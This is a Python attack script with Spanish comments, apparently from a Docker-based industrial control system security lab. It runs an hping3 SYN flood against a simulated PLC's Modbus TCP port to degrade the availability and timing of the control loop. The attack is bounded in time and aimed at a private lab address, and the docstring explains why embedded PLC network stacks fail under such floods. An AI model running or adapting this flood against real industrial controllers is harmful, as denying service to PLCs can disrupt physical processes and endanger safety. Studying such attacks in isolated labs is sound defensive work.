#!/usr/bin/env python3
"""
Ataque 4: denegacion de servicio (DoS) mediante SYN flood con hping3
contra el puerto Modbus TCP (5020) del PLC.
 
Objetivo: en vez de comprometer la integridad del proceso (como el
ataque 3) o la confidencialidad de credenciales (ataque 2), este ataque
va contra la DISPONIBILIDAD del canal de control OT en si mismo --
saturar la pila TCP/IP del PLC con paquetes SYN a un ritmo muy alto,
sin completar nunca el handshake, para impedir que clientes legitimos
(SCADA, workstation) puedan abrir conexiones nuevas o mantener las
existentes con normalidad.
 
Por que el PLC y no SCADA (decision tomada tras discutirlo, ver notas
del proyecto): los PLC reales suelen llevar pilas TCP/IP embebidas y
poco endurecidas -- es una clase de vulnerabilidad muy documentada en
avisos ICS-CERT (dispositivos que se cuelgan o reinician ante una simple
inundacion SYN). Ademas, en este laboratorio concreto, el servidor
Modbus (pymodbus) y los tres hilos de control (proceso fisico, BPCS,
SIS) corren dentro del MISMO proceso Python (ver modbus_server.py) --
como Python solo ejecuta un hilo a la vez (GIL), es plausible que saturar
el hilo del servidor Modbus con miles de conexiones robe ciclos de CPU a
los hilos de control y degrade su temporizacion real (los ciclos de
1s/3s del proceso fisico y el BPCS podrian empezar a llegar tarde) --
algo verificable observando el log del propio PLC durante el ataque
(deberia seguir imprimiendo su linea de telemetria cada ~10s; si esa
cadencia se rompe o se retrasa durante el ataque, es una senal de
degradacion real del control, no solo de la red).
 
IMPORTANTE (seguridad del propio laboratorio): --flood no espera ninguna
respuesta y envia paquetes al ritmo maximo que permita la maquina/red --
puede llegar a miles de paquetes por segundo en una red bridge de
Docker. Como el monitor enruta TODO el trafico del laboratorio (incluido
este), una inundacion muy larga podria degradar tambien el resto del
trafico legitimo (SCADA<->PLC, etc.), no solo la conexion atacada. Por
eso la duracion esta acotada por defecto (FLOOD_DURATION_S) y se
recomienda una primera prueba corta (10-15s) antes de subirla, vigilando
"docker stats" y el log del PLC en paralelo.
"""
 
import subprocess
import sys
import time
from datetime import datetime
 
TARGET_HOST = "192.168.200.3"
TARGET_PORT = 5020
 
# Duracion acotada del flood. Empezar con algo corto (10-15s) en la
# primera prueba; solo subir a algo mas largo una vez confirmado que el
# resto del laboratorio (SCADA, dashboard) sigue respondiendo con
# normalidad durante el ataque.
FLOOD_DURATION_S = 20
 
 
def log_message(message, level="INFO"):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{timestamp}] [{level}] {message}", flush=True)
 
 
def main():
    log_message(
        f"########## INICIO ataque 4: DoS (SYN flood) contra "
        f"{TARGET_HOST}:{TARGET_PORT} durante {FLOOD_DURATION_S}s ##########"
    )
 
    cmd = ["hping3", "-S", "--flood", "-p", str(TARGET_PORT), "-q", TARGET_HOST]
    log_message(f"Comando: {' '.join(cmd)}")
    log_message(
        "Mientras corre, revisa en otra terminal 'docker logs -f plc_simulator' "
        "para ver si la cadencia de telemetria (cada ~10s) se retrasa o se "
        "interrumpe -- esa es la senal de degradacion real del control, no "
        "solo de la red."
    )
 
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except FileNotFoundError:
        log_message("hping3 no esta instalado en este contenedor.", "ERROR")
        sys.exit(1)
 
    try:
        time.sleep(FLOOD_DURATION_S)
    except KeyboardInterrupt:
        log_message("Interrumpido manualmente antes de tiempo.", "WARNING")
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            log_message("hping3 no respondio a terminate(), forzando kill().", "WARNING")
            proc.kill()
            proc.wait()
 
    log_message(f"SYN flood detenido tras {FLOOD_DURATION_S}s.")
    log_message("########## FIN ataque 4 ##########")
 
 
if __name__ == "__main__":
    main()
 

